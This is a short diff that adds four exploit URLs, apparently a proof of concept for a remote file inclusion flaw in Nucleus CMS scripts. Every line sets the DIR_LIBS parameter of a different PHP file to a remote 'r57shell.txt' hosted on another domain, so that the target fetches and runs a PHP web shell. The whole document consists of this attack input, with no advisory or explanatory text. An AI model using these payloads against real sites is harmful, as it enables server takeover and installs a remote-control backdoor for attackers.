@@ -1,0 +1,4 @@
+http://www.example.com/path/action.php?DIR_LIBS=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/nucleus/media.php?DIR_LIBS=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/nucleus/xmlrpc/server.php?DIR_LIBS=http://www.example2.com/r57shell.txt?
+http://www.example.com/path/nucleus/xmlrpc/api_metaweblog.inc.php?DIR_LIBS=http://www.example2.com/r57shell.txt?
